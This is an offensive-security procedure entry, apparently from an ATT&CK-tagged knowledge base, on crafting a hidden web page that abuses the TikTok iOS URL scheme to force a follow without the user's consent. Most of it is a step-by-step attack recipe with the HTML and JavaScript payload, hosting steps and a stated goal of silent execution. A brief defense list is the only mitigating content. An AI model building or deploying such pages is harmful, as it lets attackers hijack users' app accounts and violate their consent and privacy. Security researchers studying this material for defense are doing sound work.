---
id: proc-uuid-2
tags:
  - csrf
  - html
  - malicious-page
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - iOS
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:42.632Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Craft-Malicious-CSFR-HTML-Page

## Summary

This procedure creates a malicious HTML webpage designed to exploit the TikTok URL scheme by automatically triggering a CSRF action to follow an arbitrary account.

## Description

By embedding the vulnerable URL scheme in JavaScript or an iframe, the page forces the iOS TikTok app to execute the follow action upon loading, bypassing user consent. This targets users browsing on iOS devices with the app installed, leading to unauthorized social interactions and privacy issues.

## Requirements

1. Knowledge of the target URL scheme (e.g., from discovery procedure)
2. Web hosting service or local server for page delivery
3. Text editor for HTML/JS crafting

## Defense

Defensive measures and detection strategies:

- Browser extensions to block auto-redirects or suspicious schemes
- App updates to add confirmation for URL-triggered actions
- Web filtering to detect pages with embedded app schemes

## Objectives

1. Generate a webpage that auto-triggers the URL scheme
2. Ensure silent execution without user prompts
3. Test for cross-origin compatibility on iOS Safari

## Instructions

### Step 1: Write Basic HTML Structure

**Context**: Set up the page with auto-execution logic.

Create the file:

```html
<!DOCTYPE html>
<html><body onload="triggerFollow()" style="display:none;"></body></html>
```

> Hides the page to mimic legitimate content.

### Step 2: Add JavaScript Trigger

**Context**: Use JS to invoke the scheme immediately.

Embed the script:

```javascript
function triggerFollow() {
  window.location.href = 'tiktok://user?username=malicioususer';
}
```

> On load, redirects to the scheme, opening the app.

### Step 3: Host and Verify

**Context**: Deploy and test on iOS.

Upload to a server (e.g., GitHub Pages) and visit via Safari; confirm app opens and follows occur.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[malicious-page]]
